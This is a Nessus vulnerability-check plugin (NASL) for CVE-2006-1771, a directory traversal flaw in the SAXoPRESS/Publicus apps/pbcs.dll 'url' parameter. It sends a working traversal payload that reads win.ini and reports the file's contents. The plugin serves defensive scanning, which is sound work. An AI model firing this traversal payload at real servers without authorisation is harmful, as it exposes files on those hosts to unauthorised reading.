#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21230);
  script_version("$Revision: 1.20 $");
  script_cvs_date("$Date: 2015/09/24 23:21:20 $");

  script_cve_id("CVE-2006-1771");
  script_bugtraq_id(17474);
  script_osvdb_id(24549);

  script_name(english:"SAXoPRESS pbcs.dll url Parameter Traversal Arbitrary File Access");
  script_summary(english:"Tries to retrieve a file using SAXoPRESS");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application that is prone to
directory traversal attacks.");
  script_set_attribute(attribute:"description", value:
"The remote host is running SAXoPRESS or Publicus, web content
management systems commonly used by newspapers. 

The installation of SAXoPRESS / Publicus on the remote host fails to
validate user input to the 'url' parameter of the 'apps/pbcs.dll'
script.  An attacker can exploit this issue to access files on the
remote host via directory traversal, subject to the privileges of the
web server user id.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/430707/30/0/threaded");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/04/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/04/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "web_traversal.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (get_kb_item("www/"+port+"/generic_traversal")) exit(0, "The web server listening on port "+port+" is affected by a generic directory traversal attack.");


file = "win.ini";
file_pat = "; for 16-bit app support";


# Loop through various directories.
foreach dir (cgi_dirs())
{
  foreach subdir (make_list("windows", "winnt"))
  {
    exploit = mult_str(str:"../", nb:12) + subdir + "/" + file;
    url = dir + "/apps/pbcs.dll/misc?" + 
          "url=" + exploit;

    res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
    if (egrep(pattern:file_pat, string:res[2]))
    {
      if (report_verbosity > 0)
      {
        report = 
          '\n' + "Nessus was able to retrieve the contents of '\" + subdir + "\" + file + "' on the" +
          '\n' + 'remote host by sending the following request :' +
          '\n' +
          '\n  ' + build_url(port:port, qs:url);
        if (report_verbosity > 1)
        {
          report += 
            '\n' +
            '\n' + 'Here are its contents :' +
            '\n' +
            '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + 
            '\n' + res[2] + 
            '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + 
            '\n';
        }
        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
  }
}

exit(0, "The web server listening on port "+port+" is not affected.");
